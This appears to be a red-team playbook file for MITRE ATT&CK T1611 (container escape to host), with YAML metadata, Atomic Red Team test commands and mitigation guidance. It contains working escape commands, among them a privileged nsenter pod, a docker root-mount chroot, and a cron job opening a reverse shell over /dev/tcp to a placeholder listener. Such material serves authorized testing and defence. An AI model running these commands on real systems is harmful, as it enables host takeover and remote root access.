---
name: "T1611_escape-to-host"
description: "Adversaries may break out of a container or virtualized environment to gain access to the underlying host."
category: "authorization"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1611
  - privilege-escalation
  - windows
  - linux
  - containers
  - esxi
technique_id: "T1611"
tactic: "privilege-escalation"
all_tactics:
  - privilege-escalation
platforms:
  - Windows
  - Linux
  - Containers
  - ESXi
mitre_url: "https://attack.mitre.org/techniques/T1611"
tech_stack:
  - windows
  - linux
  - containers
  - esxi
cwe_ids:
  - CWE-269
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1611 Escape to Host

## High-Level Description

Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.

There are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.

Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a Container Administration Command. Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.

In ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.

Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.

## Kill Chain Phase

- Privilege Escalation (TA0004)

**Platforms:** Windows, Linux, Containers, ESXi

## What to Check

- [ ] Identify if Escape to Host technique is applicable to target environment
- [ ] Check Windows systems for indicators of Escape to Host
- [ ] Check Linux systems for indicators of Escape to Host
- [ ] Check Containers systems for indicators of Escape to Host
- [ ] Verify mitigations are bypassed or absent (5 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Deploy container using nsenter container escape

In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.

Additional Details:
- https://twitter.com/mauilion/status/1129468485480751104
- https://securekubernetes.com/scenario_2_attack/

**Supported Platforms:** containers

```bash
kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

**Dependencies:**
- Verify docker is installed.
- Verify docker service is running.
- Verify kind is in the path.
- Verify kind-atomic-cluster is created
- Verify kubectl is in path

### Atomic Test 2: Mount host filesystem to escape privileged Docker container

This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.
The container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.
Dev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell.

**Supported Platforms:** containers
**Elevation Required:** Yes

```bash
if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}
netcat -l -p #{listen_port} 2>&1
```

**Dependencies:**
- Verify mount is installed.
- Verify container is privileged.
- Verify mount device (/dev/dm-0) exists.
- Netcat is installed.
- IP Address is known.

### Atomic Test 3: Privilege Escalation via Docker Volume Mapping

This test demonstrates privilege escalation by abusing Docker's volume mapping
feature to gain access to the host file system. By mounting the root directory
of the host into a Docker container, the attacker can use chroot to operate as
root on the host system.

**Supported Platforms:** containers
**Elevation Required:** Yes

```bash
echo "Current user: #{username}"
sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
```

**Dependencies:**
- Docker
- Docker Privileged User


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Escape to Host by examining the target platforms (Windows, Linux, Containers).

2. **Assess Existing Defenses**: Review whether mitigations for T1611 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1051 Update Software
Ensure that hosts are kept up-to-date with security patches.

### M1038 Execution Prevention
Use read-only containers, read-only file systems, and minimal images when possible to prevent the running of commands. Where possible, also consider using application control and software restriction tools (such as those provided by SELinux) to restrict access to files, processes, and system calls in containers.

### M1048 Application Isolation and Sandboxing
Consider utilizing seccomp, seccomp-bpf, or a similar solution that restricts certain system calls such as mount. In Kubernetes environments, consider defining Pod Security Standards that limit container access to host process namespaces, the host network, and the host file system.

### M1026 Privileged Account Management
Ensure containers are not running as root by default and do not use unnecessary privileges or mounted components. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers.

### M1042 Disable or Remove Feature or Program
Remove unnecessary tools and software from containers.


## Detection

### Detection Strategy for Escape to Host


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Escape to Host technique applicable | High | Privilege Escalation |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-269 | Improper Privilege Management |


## References

- [Container Escape](https://0xn3va.gitbook.io/cheat-sheets/container/escaping)
- [Broadcom VMSA-2025-004](https://github.com/vmware/vcf-security-and-compliance-guidelines/tree/main/security-advisories/vmsa-2025-0004)
- [Windows Server Containers Are Open](https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/)
- [Docker Overview](https://docs.docker.com/get-started/overview/)
- [Docker Bind Mounts](https://docs.docker.com/storage/bind-mounts/)
- [Trend Micro Privileged Container](https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html)
- [Intezer Doki July 20](https://www.intezer.com/blog/cloud-security/watch-your-containers-doki-infecting-docker-servers-in-the-cloud/)
- [Crowdstrike Kubernetes Container Escape](https://www.crowdstrike.com/blog/cve-2022-0185-kubernetes-container-escape-using-linux-kernel-exploit/)
- [Keyctl-unmask](https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/)
- [Atomic Red Team - T1611](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1611)
- [MITRE ATT&CK - T1611](https://attack.mitre.org/techniques/T1611)
